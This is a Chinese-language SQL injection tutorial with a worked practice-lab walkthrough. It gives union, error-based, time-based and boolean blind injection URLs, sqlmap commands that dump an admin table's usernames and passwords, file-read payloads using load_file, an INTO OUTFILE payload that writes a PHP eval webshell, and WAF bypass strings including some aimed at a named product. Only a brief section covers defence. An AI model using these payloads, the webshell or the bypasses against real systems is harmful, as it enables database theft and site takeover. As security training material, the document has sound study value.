# SQL注入漏洞入门

# SQL注入—联合注入

## 概述：

所谓的SQL注入就是通过某种方式将恶意的SQL代码添加到输入参数中，然后传递到SQL服务器使其解析并执行的一种攻击手法。

​	

## 前置知识：

### MySQL数据库：

- 需要有一些MySQL基础，需知道：**数据库**、**表**、**字段**、**数据**之间的关系、`select查询语句`(下面有)、`order by`、`and`、`group_concat()`(下面有)。

- 在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个`information_schema`的数据库，在该库中，我们需要记住三个表名，分别是`schemata`，`tables`，`columns`。
  - Schemata 表**存储的是该用户创建的所有数据库的库名**，需要记住该表中记录数据库名的字段名为 `schema_name`。
  - Tables 表**存储该用户创建的所有数据库的库名和表名**，要记住该表中记录数据库 库名和表名的字段分别是 `table_schema`和 `table_name`。
  - Columns 表**存储该用户创建的所有数据库的库名、表名、字段名**，要记住该表中记录数据库库名、表名、字段名为 `table_schema`、`table_name`、`columns_name`。 


- MySQL的查询语句是```SELECT * FROM 表名 WHERE 条件; --- 从某个表查询符合某个条件的所有数据```
`*`可以换成你指定要查询的字段数据。

- `union`：MySQL中，union用于将多个select语句的结果组合到一个结果集中，并删除结果集中的重复数据。

- `group_concat()`：把数据分组连接(大概这么解释)。

- `order by 数字`：**把查询的数据按第n个字段排序。**

- `Database()`：查询当前网站使用的数据库。

[快速回忆MySQL增删改查和常见函数](https://urp1gyfvvr.feishu.cn/docx/Rjg7dmrnVoUK4IxJ1accuLatnJf)

​	

## SQL注入流程：

### SQL注入漏洞的探测方法：

1. 找到网站交互点：地址栏、搜索框、表单
   - 地址栏：某个界面的地址栏URL格式类似为`http://xxxxxxx?id=数字`则符合要求。
2. 在`id=数字`后面加单引号`'`或双引号`"`、等看看是否报错，如果报错就**可能存在** SQL注入漏洞。
3. 判断是 **“数字型”** 还是 **“字符型”** 以及 **是否存在SQL漏洞** ：
   - 在`id=数字`后面加上 `and 1=1`页面显示正常，换成 `and 1=2`页面显示错误，说明 **一定存在SQL注入** 且为 **“数学型”** 。
   - 在`id=数字`后面加上 `' and 1=1 #`页面显示正常，换成 `' and 1=2 #`页面显示错误，说明 **一定存在SQL注入** 且为 **“字符型”** 。
   - 如果都显示不正常说明不存在SQL注入漏洞(当有可能是其他情况，由于本篇只讲基础故当做不存在)。

> 如果为“字符型”，后文提到的代码都要在代码前面加上`'`、后面加上`#`。

​	

### SQL注入：

#### 1.判断页面有几个字段：

**原因：`union`前面的查询语句的字段数量和后面的查询语句字段数量要一致**

在`id=数字`后加上`order by 数字`即`id=数字 order by 数字`
> 如果是字符型则为`id=数字' order by 数学#`

意思是**把查询的数据按第n个字段排序**，如果页面上的字段大于n则会显示错误。

所以一开始可以随便`order by`一个数字，如果显示错误就减小数字，如果正常显示就增大数字。

直到你`order by n`**能正常显示**、`order by n+1`**就显示错误** ，说明n就是这个页面的字段数。

>  ps：善用二分法。

#### 3.通过联合查询查看字段在前端的回显位置：
  对于一个网页，如果它的字段数是3，但可能只有第1，2字段的数据返回页面前端。所以我们需要查询哪个字段会回显，得用`union select `联合查询来查看字段在前端的回显位置

    id=数字 and 1=2 union select 1,2
    ---或者
    id=不存在的数字 union select 1,2,3

`and 1=2`或者`id=不存在的数字`：使前一句的SQL语句为错误
> 不存在的数字：假如一个网页有`id=1`的页面和`id=2`的页面，改成`id=-1`(除了1和2的其他数字都行)，就没有相对应的页面显示；`and 1=2`也是同理。

> 之所以让前半句出错是因为程序在展示数据的时候通常只会取结果集的第一行数据，只要让第一行查询的结果是空集，即`union`左边的`select子句`查询结果为空，那么`union`右边的查询结果自然就成为了第一行，打印在网页上了

`union select 1,2,3`：联合查询，让第一个字段显示“1”、第二个字段显示“2”、第三个字段显示“3”，从而来找可以回显的字段在页面的位置

#### 4.查询目标数据库名：
在得到字段数之后就可以查询数据库名。

查询数据库名的函数是`database()`。

假设我们已经找到某个可回显字段的位置(比如显示“2”的字段)，记住这个字段位置，在地址栏输入：

    http://xxxxxxx?id=1 and 1=2 union select 1,database(),3


#### 5.查询目标数据库名里的所有表名：

    http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = "目标数据库名"

- 在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个`information_schema`的数据库。

- `information_schema`数据库里有个`tables`表。

- `tables`表里有`table_schema`和`table_name`字段。

- `table_schema`字段存的是网站管理员创建的所有数据库的库名。

- `table_name`字段存的是网站管理员创建的所有数据库的表名。

这句代码的意思是从`information_schema`数据库里的`tables`表里找`table_schema`字段里的数据为 **目标数据库名** 所对应的`table_name`字段里的数据，即查询 **目标数据库名内的所有表名**。

`group_concat(table_name)`：将查询到的表名用`,`连起来。

#### 6.查询目标表名内的所有字段名

    http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = "目标表名"

#### 7.查询目标字段名内的数据

    http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(目标字段名),3 from 目标表名

如果要一次性查询多个字段内的数据：

    http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(字段名1,";",字段名2,";",字段名3),3 from 目标表名

`;`用来分隔多个字段名内的数据

​	

## 拓展实战：

### 手工注入：

这是一个SQL注入的靶场，目标是找到“flag”

<img src="https://pic1.imgdb.cn/item/646f1050f024cca1735aec3a.png"  />

首先我们要去找到交互点，这个界面的交互点只有最上面的地址栏，但没有类似`http://xxxxxxx?id=数字`，没法做SQL注入。

所以要先找到地址栏有类似于`id=数字`这样的界面

可以看到这里有个**查看新闻**的按钮

<img src="https://pic1.imgdb.cn/item/646f11ecf024cca1735e3427.jpg"  />

点进去之后看到地址栏出现了我们期待的`?id=1`，接下来就是测试这个交互点（地址栏）是否存在SQL注入了！

<img src="https://pic1.imgdb.cn/item/646f1268f024cca1735f35ba.jpg"  />

上文有提到SQL注入的流程，首先我们在`1`后面加个 `‘`，即`http://pu2lh35s.ia.aqlab.cn/?id=1'`，访问后发现页面出错了（内容没了）

![](https://pic1.imgdb.cn/item/646f136cf024cca173615e4b.jpg)

接着我们再试试在后面加上 `and 1=1`，即`http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=1`，可以看到页面照常显示

![](https://pic1.imgdb.cn/item/646f1403f024cca1736267a4.jpg)

到这里就说明了地址栏这个交互点存在SQL注入

接着是判断页面有几个字段

地址栏输入：

```
http://pu2lh35s.ia.aqlab.cn/?id=1 order by 2
```

回车后页面正常显示：

![](https://pic1.imgdb.cn/item/646f6c1df024cca173f09157.jpg)

地址栏输入：

```
http://pu2lh35s.ia.aqlab.cn/?id=1 order by 3
```

回车后页面显示错误：

![](https://pic1.imgdb.cn/item/646f6cf9f024cca173f1de97.jpg)

由此可以断定当前页面有2个回显字段

接下来是通过联合查询查看字段在前端的回显位置

地址栏输入：

```
http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,2
```

回车后页面显示：

![](https://pic1.imgdb.cn/item/646f6da2f024cca173f2cd65.jpg)

说明圈起来的那个字段是可利用的回显字段

接下来是利用这个字段来查询当前页面的数据库名

```
http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,database()
```

回车后的页面：

![](https://pic1.imgdb.cn/item/646f6e8bf024cca173f44560.jpg)

得到了数据库名 `maoshe` 

接下来是查询数据库 `maoshe`里有哪些表名

地址栏输入：

```
http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema = "maoshe"
```

 回车后的页面：

![](https://pic1.imgdb.cn/item/646f6f66f024cca173f5942c.jpg)

得到了 `maoshe` 数据库下的所有表名： `admin`,`dirs`,`news`,`xss`

根据经验，`admin`表（admin意思是管理员）里肯定有“好东西”

> 当然，可以每个表都查一遍

现在来查询`admin`表里有哪些字段

地址栏里输入：

```
http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name = "admin"
```

回车后的页面：

![](https://pic1.imgdb.cn/item/646f70c3f024cca173f7ac96.jpg)

得到了 `admin`表下的所有字段名： `Id`,`username`,`password`

根据经验，`password`字段和`username`字段里肯定有“好东西”（`username`意思是用户名、`password`意思是密码）

> 当然，也可以去看看其他的字段里存什么数据

现在来查询`password`字段和`username`字段里有啥数据

地址栏里输入：

```
http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,group_concat(username) from admin
```

```
http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,group_concat(password) from admin
```

回车后的页面：

![](https://pic1.imgdb.cn/item/646f730df024cca173fb5863.jpg)

![](https://pic1.imgdb.cn/item/646f738cf024cca173fc34a4.jpg)

获取到了`username`：**admin**、`password`：**hellohack,zkaqbanban**

把**hellohack**拿去提交。

​	

### 使用工具sqlmap注入：

首先还是得先找到地址栏（URL）类似为：`http://xxxxxxx?id=数字`的页面

点击**查看新闻**的按钮

![](https://pic1.imgdb.cn/item/646f11ecf024cca1735e3427.jpg)

点完之后的URL为：`http://pu2lh35s.ia.aqlab.cn/?id=1`,符合要求

![](https://pic1.imgdb.cn/item/646f1268f024cca1735f35ba.jpg)



打开sqlmap，输入：

```
python sqlmap.py -u "http://pu2lh35s.ia.aqlab.cn/?id=1" --dbs
```

这一步是扫出网站数据库名

结果如下：

![](https://pic1.imgdb.cn/item/6472b97ff024cca17306c56f.jpg)

从sqlmap扫到的数据库名来看我们得到了三个数据库名：

- `information_schema`
- `maoshe`
- `test`



文章开头提到的，在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个`information_schema`的数据库

`test`数据库是MySQL系统默认安装时自带的一个数据库名，它通常用于进行测试和示例目的，而不是用于实际的生产环境

于是我们得到了网站的数据库名为：` maoshe`

> ```
> sqlmap.py -u "http://xxxxxxx?id=1" --current-db
> ```
>
> 可以直接输出网站当前数据库，当时我不知道 ╥﹏╥



接下来要去扫`maoshe`数据库下的表名，输入：

```
python sqlmap.py -u "http://pu2lh35s.ia.aqlab.cn/?id=1" -D maoshe --tables
```

结果如下：

![](https://pic1.imgdb.cn/item/6472bd3df024cca1730a7469.jpg)

从sqlmap扫到的数据库名来看我们得到了四个数据表名：

- `admin`
- `dirs`
- `news`
- `xss`



接下来是查询`admin`表下有哪些字段名，输入：

```
python sqlmap.py -u "http://pu2lh35s.ia.aqlab.cn/?id=1" -D maoshe -T admin --columns
```

结果如下：

![](https://pic1.imgdb.cn/item/6472c186f024cca17310f399.jpg)

从sqlmap扫到的字段(列)名来看我们得到了四个字段名：

- `Id`
- `username`
- `password`





接下来是查询`password`字段里存放的数据，输入：

```
python sqlmap.py -u "http://pu2lh35s.ia.aqlab.cn/?id=1" -D maoshe -T admin -C password --dump
```

结果如下：

![](https://pic1.imgdb.cn/item/6472c1e9f024cca1731152a3.jpg)

sqlmap扫到`password`字段里存放的数据为：

`hellohack zkaqbanban`

​	

​	

# SQL注入—高权限注入

## MySQL 权限介绍

MySQL服务器通过权限表来控制用户对数据库的访问，权限表存放在 `mysql` 数据库中，`mysql` 库中存在4个控制权限的表：`user` 表，`db` 表，`tables_priv` 表，`columns_priv` 表。

​	

### 系统权限表

- User 表：存放用户账户信息以及全局级别（所有数据库）权限，决定了来自哪些主机的哪些用户可以访问数据库实例，如果有全局权限则意味着对所有数据库都有此权限
- Db 表：存放数据库级别的权限，决定了来自哪些主机的哪些用户可以访问此数据库
- Tables_priv 表：存放表级别的权限，决定了来自哪些主机的哪些用户可以访问数据库的这个表
- Columns_priv 表：存放列级别的权限，决定了来自哪些主机的哪些用户可以访问数据库表的这个字段
- Procs_priv 表：存放存储过程和函数级别的权限

	

### MySQL 权限级别

- 全局性的管理权限： 作用于整个 MySQL 实例级别
- 数据库级别的权限： 作用于某个指定的数据库上或者所有的数据库上
- 数据库对象级别的权限：作用于指定的数据库对象上（表、视图等）或者所有的数据库对象

	

### mysql权限表的验证过程

1. 从 user 表中的 Host, User, Password 这3个字段中判断连接的 ip、用户名、密码是否存在，存在则通过验证
2. 通过身份认证后，进行权限分配
3. 按照 user，db，tables_priv，columns_priv 的顺序进行验证
4. 先检查全局权限表 user，如果 user 中对应的权限为 Y，则此用户对所有数据库的权限都为 Y，将不再检查 db、tables_priv、columns_priv
5. 如果为 N，则到 db 表中检查此用户对应的具体数据库并得到 db 中为 Y 的权限
6. 如果 db 中为 N，则检查 tables_priv 中此数据库对应的具体表，取得表中的权限 Y，以此类推

	

### 查看 MySQL 服务器有哪些用户

```mysql
select user, host from mysql.user;
```

​	

### 查看用户对应权限

```mysql
select * from user where user='root' and host='localhost'\G;  #如果所有权限都是 Y ，就是什么权限都有
```

​	

### 创建 MySQL 用户

有两种方式创建 MySQL 授权用户

```mysql
#执行 create user/grant 命令（推荐方式）
CREATE USER 'finley'@'localhost' IDENTIFIED BY 'some_pass';

#通过 insert 语句直接操作 MySQL 系统权限表
```

​	

### 只提供 id 查询权限

```mysql
grant select(id) on test.temp to test1@'localhost' identified by '123456';
```

​	

### 把普通用户变成管理员

```mysql
GRANT ALL PRIVILEGES ON *.* TO 'test1'@'localhost' WITH GRANT OPTION;
```

​	

### 删除用户

```mysql
drop user finley@'localhost';
```

​	

​	

## 高权限注入

**注入流程与正常的手工注入流程差不多**

​	

### 查询所有数据库名称

![](https://pic.imgdb.cn/item/64c1e59c1ddac507cc84eff2.jpg)

```
http://localhost/sqli-labs-master/Less-2/?id=-2 union select 1,group_concat(schema_name),3 from information_schema.schemata
```

​	

### 查询数据库对应的表名

![](https://pic.imgdb.cn/item/64c1e6af1ddac507cc867e76.jpg)

```
http://localhost/sqli-labs-master/Less-2/?id=-2 union select 1,group_concat(table_name),3 from%20information_schema.tables where table_schema=test
```

​	

### 查询表名对应的字段名

![](https://pic.imgdb.cn/item/64c1e6bf1ddac507cc8695d7.jpg)

```
http://localhost/sqli-labs-master/Less-2/?id=-2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=t1
```

​	

### 查询数据

![](https://pic.imgdb.cn/item/64c1e6d01ddac507cc86a965.jpg)

```
http://localhost/sqli-labs-master/Less-2/?id=-2 union select 1,name,pass from test.t1
```

​	

​	

# SQL注入—文件读写注入

## 读写注入的原理

利用文件的读写权限进行注入，它可以写入一句话木马，也可以读取系统文件的敏感信息。

​	

## 文件读写注入的条件

高版本的 MySQL 添加了一个新的特性：`secure_file_priv` 系统变量，该变量限制了 MySQL 导出文件的权限。

### `secure_file_priv` 变量的路径：

- Linux：`cat etc/conf`
- Windows：`www/mysql/my.ini`

	

### 查看 MySQL 全局变量的配置：

(在 MySQL 数据库中输入)

```mysql
show global variables like '%secure%';
```

​	

### 文件读写注入的条件：

1、读写文件需要 `secure_file_priv` 权限

- `secure_file_priv=''`：代表对文件读写没有限制
- `secure_file_priv=NULL`：代表不能进行文件读写
- `secure_file_priv=d:/phpstudy/mysql/data`：代表只能对该路径下文件进行读写
> 在 MySQL 5.5 之前 `secure_file_priv` 默认为空
> 在 MySQL 5.5 之后 `secure_file_priv` 默认为 NULL

​	

2、知道网站绝对路径

Windows 常见的绝对路径：

- phpstudy: `phpstudy/www`  `phpstudy/PHPTutorial/www`
- Xampp: `xampp/htdocs`
- Wamp: `wamp/www`
- Appser: `appser/www`

Linux 常见的绝对路径：

- `/var/mysql/data`
- `/var/www/html`

	

路径获取常见方式：

- 报错显示
- 遗留文件
- 漏洞报错
- 平台配置文件等

	

## 读取文件

使用函数：`load_file()`

后面的路径可以是单引号，0x，char 转换的字符。

注意：路径中斜杠是 `/` 不是 `\`

一般可以在联合查询中做为一个字段使用，查看 config.php (即 MySQL 的密码)，apache 配置...

```mysql
#读取路径下的某个文件并返回结果
http://127.0.0.1/mysql/Less-1/?id=-1' union select 1,2,load_file('c:/users/wutongliran/desktop/2.txt') --+
```

​	

## 写入文件

使用函数：

- `into outfile`：能写入多行，按格式输出
- `into dumpfile`：只能写入一行且没有输出格式

`into outfile` 后面不能接 0x 开头或者 char 转换以后的路径，只能是单引号路径

```mysql
#将木马写入指定位置
http://127.0.0.1/mysql/Less-1/?id=-1' union select 1,'<?php eval($_REQUEST[wtlr]); ?>',3 into outfile 'D://1.php'--+
```

​	

​	

# SQL注入之基础防御

## 魔术引号

魔术引号（Magic Quote）是一个自动将进入 PHP 脚本的数据进行转义的过程。

当打开时，所有的 '（单引号），"（双引号），\（反斜线）都会被自动加上一个反斜线进行转义。这和 **addslashes()** 作用完全相同。

魔术引号在php.ini文件内找

```
magic_quotes_gpc = On/Off 开启/关闭
```

​	

## 内置函数

做数据类型的过滤

- is_int()

- addslashes()

- mysql_real_escape_string()

  > 已被弃用

- mysql_escape_string()

  > 已被弃用

	

## 自定义函数来检测关键字

## 安全防护软件 WAF

​	

​	

# SQL注入之数据类型

## 1、数字型注入点

- 结构 ：http://xxx.com/users.php?id=1
-  SQL 语句原型： `select * from 表名 where id=1` 
- 爆破：`id=1 and 1=1`
- 爆破后的SQL 语句：`select * from 表名 where id=1 and 1=1`

	

## 2、 字符型注入点

- 结构 ：http://xxx.com/users.php?name=admin
-  SQL 语句原型大概为：`select * from 表名 where name='admin'`
- 爆破：`admin' and 1=1 #` 
- 爆破后的SQL 语句：`select * from 表名 where name='admin' and 1=1 #'` 

	

## 3、 搜索型注入点

- 结构 ：一般在链接地址中有 `"keyword=关键字"` 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。
-  SQL 语句原型大概为：`select * from 表名 where 字段 like '%关键字%'` 
- 爆破：`关键字%' or 1=1 #` 
- 爆破后的SQL 语句：`select * from 表名 where 字段 like '%关键字%' or 1=1 #%`

	

## 4、 xx型注入点

- SQL 语句原型大概为：`select * from 表名 where username=('admin')` 
- 爆破：`'admin') and 1=1 #` 
- 爆破后的SQL 语句：`select * from 表名 where username=(''admin') and 1=1 #')`
- 常见的闭合符号：`'`     `"`   ` %`     `(`      `{`

​	

​	

# SQL注入—报错盲注

## Xpath报错注入 (extractvalue和updatexml)

在MySQL高版本（大于5.1版本）中添加了对XML文档进行查询和修改的函数：

- updatexml()
- extractvalue()

>  当这两个函数在执行时，如果出现xml文档路径错误就会产生报错

​	

### updatexml()

- updatexml()是一个使用不同的xml标记匹配和替换xml块的函数。

- 作用：改变文档中符合条件的节点的值

- 语法： updatexml（XML_document，XPath_string，new_value） 
  第一个参数：代表string格式，为XML文档对象的名称，文中为Doc 
  第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 
  第三个参数：string格式，替换查找到的符合条件的数据

- updatexml使用时，当xpath_string格式出现错误，MySQL会爆出xpath语法错误（XPATH syntax error）

- 例如： select * from test where id = 1 and (updatexml(1,0x7e,3)); 
  由于0x7e是~，不属于Xpath语法格式，因此报出Xpath语法错误。

  

​	

### extractvalue()

- 此函数从目标XML中返回包含所查询值的字符串 
- 语法：extractvalue（XML_document，xpath_string） 
  第一个参数：string格式，为XML文档对象的名称 
  第二个参数：xpath_string（xpath格式的字符串） 
- select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
- extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）
- ' union select 1,extractvalue(1,concat(0x7e,(select version())))%23
- ' or extractvalue(1,concat(0x7e,database())) or'

​	

​	

# SQL注入—时间盲注 (延时注入)

## 相关函数

- sleep(n) : 代码执行期间等待 n 秒
- if(a, b, c) : 如果 a 为真，执行 b；如果 a 为假，执行 c
- mid(a, b, c) : 从字符串 a 的第 b 位起(从 1 开始算)，截取 c 个字符
- substr(a, b, c) : 从字符串 a 的第 b 位起(从 1 开始算)，截取 c 个字符
- left(a, c) : 从字符串 a 的最左边起，截取 c 个字符
- length('s') : 获取字符串 s 的长度
- ascii('c') : 获取字符 c 的长度

​	

## 判断数据库名长度

```mysql
if(length(database())=4,sleep(5),sleep(0))
```

> 如果数据库名的长度为 4，代码执行期间等待 5 秒；
>
> 反之则不延时。

​	

## 猜解数据库名

```mysql
if(ascii(substr(database(),1,1)=116),sleep(5),sleep(0))
```

> 入果数据库名的前 1 位的字符的ASCII码的值为 116 ，代码执行期间等待 5 秒；
>
> 反之则不延时。

​	

​	

# SQL注入—布尔盲注

![](https://pic.imgdb.cn/item/64c4e4561ddac507cc81da4d.jpg)

## 相关函数

- if(a, b, c) : 如果 a 为真，执行 b；如果 a 为假，执行 c
- mid(a, b, c) : 从字符串 a 的第 b 位起(从 1 开始算)，截取 c 个字符
- substr(a, b, c) : 从字符串 a 的第 b 位起(从 1 开始算)，截取 c 个字符
- left(a, c) : 从字符串 a 的最左边起，截取 c 个字符
- length('s') : 获取字符串 s 的长度
- ascii('c') : 获取字符 c 的长度


​	

## 判断数据库名长度

```mysql
http://127.0.0.1/sql/Less-5/index.php?id=1' and length(database())=8--+ #页面正常
```

​	

## 猜解数据库名

```mysql
http://127.0.0.1/sql/Less-5/index.php?id=1' and ascii(mid(database(),1,1))=115--+ #页面正常
```

​	

## 猜解表名

```mysql
http://127.0.0.1/sql/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114--+ #页面正确
```

​	

​	

# SQL注入—WAF绕过

### `WAF拦截原理：WAF从规则库中匹配敏感字符进行拦截。`

![image.png](https://pic.imgdb.cn/item/64c5f2481ddac507cc26529e.jpg)

## 关键词大小写绕过

有的WAF因为规则设计的问题，只匹配纯大写或纯小写的字符，对字符大小写混写直接无视，这时，我们可以利用一点来进行绕过

```sql
union select ---> unIOn SeLEcT
```

## 编码绕过

针对WAF过滤的字符编码，如使用URL编码，Unicode编码，十六进制编码，Hex编码等

```sql
union select 1,2,3# ---> union%0aselect 1\u002c2,3%23
```

## 双写绕过

部分WAF只对字符串识别一次，删除敏感字段并拼接剩余语句，可以通过双写来进行绕过

```sql
UNIunionON

SELselectECT

anandd
```

## 换行(\N)绕过

```sql
select * from admin where username = \N union select 1,user() from admin
```

## 注释符内联注释绕过：

```sql
union selecte ---> /*!union*/ select
```

## 同义词替换

```
and ---> &&

or ---> ||

=(等于号)=<、>

空格 ---> %09、%0a、%0b、%0c、%0d、%20、%a0等

# %0a是换行，也可以替代空格
```

## HTTP参污染

对目标发送多个参数，如果目标没有多参数进行多次过滤，那么WAF对多个参数只会识别其中的一个

```sql
?id=1&id=2&id=3

?id=1/**&id=-1%20union%20select%201,2,3%23*/
```

## 安全狗 V4.0绕过

```sql
order by绕过：	%20/*//--/*/  

联合绕过：		union /*!--+/*%0aselect/*!1,2,3*/ --+

from绕过： 	/*!06447%23%0afrom*/
```

